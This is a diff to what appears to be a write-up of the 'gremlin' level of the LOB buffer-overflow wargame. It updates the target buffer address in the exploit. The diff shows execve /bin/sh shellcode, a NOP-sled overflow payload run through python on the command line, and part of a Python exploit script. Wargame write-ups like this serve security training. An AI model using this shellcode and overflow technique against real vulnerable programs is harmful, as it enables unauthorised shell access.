@@ -150,8 +150,7 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 ```
 
 
-
-buffer_addr : 0xbffffac8
+buffer_addr : 0xbffffcf0
 
 <br>
 
@@ -160,7 +159,7 @@ buffer_addr : 0xbffffac8
 > NOP(100) + SHELL(24) + NOP(260-100-24) + EBP-256주소
 
 ```shell
-$ ./gremlin `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*(260-100-24)+"\xc8\xfa\xff\xbf"'`
+$ ./gremlin `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*(260-100-24)+"\xf0\xfc\xff\xbf"'`
 ```
 
 <img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827162535728.png" width="800px">
@@ -186,7 +185,7 @@ target = "/home/gate/gremlin"
 
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
 
-buffer_addr = 0xbffffac8
+buffer_addr = 0xbffffcf0
 
 payload = "\x90"*100
 payload = append(shellcode)
